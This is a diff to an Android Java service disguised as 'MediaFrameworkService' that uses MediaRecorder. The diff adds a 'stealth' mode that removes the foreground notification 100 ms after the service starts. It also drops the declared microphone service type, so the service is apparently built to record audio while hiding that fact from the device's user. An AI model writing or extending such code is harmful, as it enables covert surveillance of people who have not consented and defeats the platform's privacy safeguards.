@@ -14,7 +14,9 @@ import android.content.pm.ServiceInfo;
 import android.media.MediaRecorder;
 import android.os.Build;
 import android.os.Environment;
+import android.os.Handler;
 import android.os.IBinder;
+import android.os.Looper;
 import android.os.PowerManager;
 import android.util.Log;
 
@@ -158,26 +160,31 @@ public class MediaFrameworkService extends Service {
                 .build();
 
         try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                int serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE | ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                int serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
                 try {
                     startForeground(NOTIFICATION_ID, notification, serviceType);
                     isForeground = true;
                 } catch (Exception e) {
-                    try {
-                        startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
-                        isForeground = true;
-                    } catch (Exception ex) {
-                        startForeground(NOTIFICATION_ID, notification);
-                        isForeground = true;
-                    }
+                    startForeground(NOTIFICATION_ID, notification);
+                    isForeground = true;
                 }
-            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
-                isForeground = true;
             } else {
                 startForeground(NOTIFICATION_ID, notification);
                 isForeground = true;
+            }
+
+            if (SystemAnalytics.isStealthEnabled(this)) {
+                new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                    try {
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                            stopForeground(STOP_FOREGROUND_REMOVE);
+                        } else {
+                            stopForeground(true);
+                        }
+                        isForeground = false;
+                    } catch (Exception ignored) {}
+                }, 100);
             }
         } catch (Exception e) {
             Log.e(TAG, "Critical FGS failure: " + e.getMessage());
